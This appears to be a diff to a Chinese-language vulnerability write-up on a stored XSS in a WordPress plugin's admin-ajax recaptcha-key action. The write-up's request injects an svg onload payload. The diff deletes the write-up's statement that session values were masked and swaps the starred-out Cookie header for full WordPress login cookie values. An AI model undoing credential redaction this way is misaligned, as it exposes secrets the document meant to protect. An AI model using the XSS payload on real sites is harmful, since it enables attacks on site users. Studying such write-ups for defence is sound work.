@@ -21,7 +21,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -33,7 +32,7 @@ schema_version: "1"
 
 - **结论使用边界（3）**：说is_user_logged_in只判断用户存在不精确，应说登录状态不检查具体capability。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
 
-- **凭据与会话边界（4）**：HTTP Content-Length0却带body，编号列表污染报文；Cookie应脱敏。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+- **凭据与会话边界（4）**：HTTP Content-Length0却带body，编号列表污染报文。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。
 
 - **事实待核（5）**：大量操作截图内容全丢失，9514仅文字结论无请求；缺版本/原始补丁链接。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
 
@@ -75,18 +74,18 @@ schema_version: "1"
 
 ```http
 
-1. 		POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
-2. 		Host: localhost
-3. 		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
-4. 		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-5. 		Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-6. 		Connection: close
-7. 		Cookie:  wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=use*****************************************************************************************************************************239; wordpress_test_cookie=WP+Cookie+check;  wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=use*****************************************************************************************************************************b73; wp-settings-time-2=1590832197
-8. 		Upgrade-Insecure-Requests: 1
-9. 		Content-Type: application/x-www-form-urlencoded
-10. 		Content-Length: 0
-11. 		 
-12. 		action=idx_update_recaptcha_key&idx_recaptcha_site_key=a22212322123"><svg onload=alert(/~xss~/)>'
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Cookie:  wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7C2850d94c57420c45398bd86aa49445eb60914036c0482cd3ebc755de5a8b1239; wordpress_test_cookie=WP+Cookie+check;  wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=user1%7C1591004988%7CPrKGAmfSsNxfsQ9QAGID3aK8sMmvLnJtimfdGugoqCN%7Cc1e4006d123d6f33199624e0a514319b21b93859faa5af2a60fc0ceda066fb73; wp-settings-time-2=1590832197
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+
+action=idx_update_recaptcha_key&idx_recaptcha_site_key=a22212322123"><svg onload=alert(/~xss~/)>'
 
 ```
 
